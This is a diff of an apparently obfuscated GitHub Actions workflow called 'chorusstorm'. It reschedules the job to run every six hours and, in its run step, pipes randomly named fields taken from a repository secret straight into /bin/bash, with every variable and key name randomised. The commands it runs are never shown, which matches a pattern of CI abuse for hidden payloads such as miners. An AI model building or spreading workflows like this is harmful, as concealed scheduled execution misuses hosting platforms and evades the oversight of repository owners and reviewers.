@@ -3,29 +3,26 @@ name: chorusstorm
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
-
+    - cron: '2 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chorusstorm
         env:
-          upfip356: ${{ secrets.upfip356 }}
+          xl16: ${{ secrets.xl16 }}
         run: |
-          echo $upfip356 | jq -r .pqs207 | /bin/bash
-          echo $mnbv0027 | jq -r .uxrfl702 | /bin/bash
-          echo $gpws4291 | jq -r .djj2001 | /bin/bash
-          echo $stv34 | jq -r .wtdc0 | /bin/bash
-          echo $qewzh1864 | jq -r .zx9198 | /bin/bash
-          echo $sv96 | jq -r .ruyb6782 | /bin/bash
-          echo $ze6118 | jq -r .v0 | /bin/bash
-          echo $l8 | jq -r .jhutv9 | /bin/bash
-          echo $iju11 | jq -r .w0 | /bin/bash
-          echo $gb84 | jq -r .q2 | /bin/bash
-          echo $gw89451 | jq -r .v1729 | /bin/bash
-          echo $zh40 | jq -r .elec0 | /bin/bash
-          echo $df15 | jq -r .gd3785 | /bin/bash
-          echo $zkh232 | jq -r .ximg3 | /bin/bash
+          echo $xl16 | jq -r .trsu1767 | /bin/bash
+          echo $xxwg25517 | jq -r .zeoxe2 | /bin/bash
+          echo $rsw411 | jq -r .ujm44 | /bin/bash
+          echo $qeps40 | jq -r .cp90849 | /bin/bash
+          echo $yidle58175 | jq -r .qqwu849 | /bin/bash
+          echo $xb069 | jq -r .fvqwb80168 | /bin/bash
+          echo $gh749 | jq -r .f59 | /bin/bash
+          echo $nm0 | jq -r .k50623 | /bin/bash
+          echo $iwyhk4326 | jq -r .f96756 | /bin/bash
+          echo $vtpn019 | jq -r .y41707 | /bin/bash
+          echo $zgfx1 | jq -r .fzxxg36 | /bin/bash
 
